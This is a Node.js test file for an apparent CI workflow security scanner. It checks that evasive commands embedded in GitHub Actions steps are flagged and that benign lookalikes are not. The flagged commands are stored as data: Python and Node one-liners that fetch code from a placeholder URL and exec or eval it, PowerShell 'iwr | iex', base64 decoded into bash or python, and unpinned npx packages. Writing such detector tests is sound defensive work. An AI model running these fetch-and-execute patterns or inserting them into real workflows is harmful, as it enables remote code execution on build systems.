'use strict';
// Additional outside-the-corpus evasions. Data-only; zero shell execution.
const test=require('node:test'),assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
function inspect(cmd){
 const yaml=['on: issue_comment','permissions: read-all','jobs:','  audit:',
 '    runs-on: ubuntu-latest','    steps:','      - run: |',
 ...cmd.split('\n').map(s=>'          '+s)].join('\n')+'\n';
 return inspectWorkflow(yaml,{path:'.github/workflows/deep-edges.yml'});
}
const U='https://example.invalid/p';
const attacks=[
 ['REMOTE_INTERPRETER_FETCH_EXECUTION',"python - <<'EOF'\nimport urllib.request\nu='"+U+"'\nexec(urllib.request.urlopen(u).read())"],
 ['REMOTE_INTERPRETER_FETCH_EXECUTION',"node <<'JS'\nconst u='"+U+"';\nfetch(u).then(async r => eval(await r.text()))"],
 ['MUTABLE_PACKAGE_EXECUTION','npx -p demo@latest demo'],
 ['MUTABLE_PACKAGE_EXECUTION','npm exec -p demo@next -- demo'],
 ['MUTABLE_PACKAGE_EXECUTION','npx --yes -p @scope/demo@latest demo'],
 ['REMOTE_POWERSHELL_EXECUTION','pwsh -Command "iwr '+U+' | & iex"'],
 ['REMOTE_POWERSHELL_EXECUTION','powershell -Command "Invoke-WebRequest '+U+' | & Invoke-Expression"'],
 ['REMOTE_ENCODED_EVAL',"echo 'Y29udGVudA==' | base64 -d | \\\nbash"],
 ['REMOTE_ENCODED_EVAL',"printf %s 'Y29udGVudA==' | base64 --decode |\npython"],
];
for(const [i,[rule,script]] of attacks.entries()){
 test('deep-edge RED '+i+' '+rule,()=>{
  assert.ok(findingsForScript(script).includes(rule),'Scanner escaped '+JSON.stringify(script));
  const r=inspect(script);
  assert.ok(r.findings.some(f=>f.rule===rule&&f.severity==='HIGH'),
    rule+': '+JSON.stringify(r));
 });
}
for(const cmd of [
 'npx -p demo@1.2.3 demo',
 'npm exec -p @scope/demo@2.0.0 -- demo',
 'pwsh -Command "Write-Host iwr '+U+' | & iex"',
 'printf %s Y29udGVudA== | base64 -d',
 "python - <<'PY'\nu='"+U+"'\nprint(u)\nPY"
]){
 test('deep-edge benign lookalike '+cmd.slice(0,35),()=>{
  const found=findingsForScript(cmd);
  assert.deepEqual(found,[],JSON.stringify(found));
 });
}
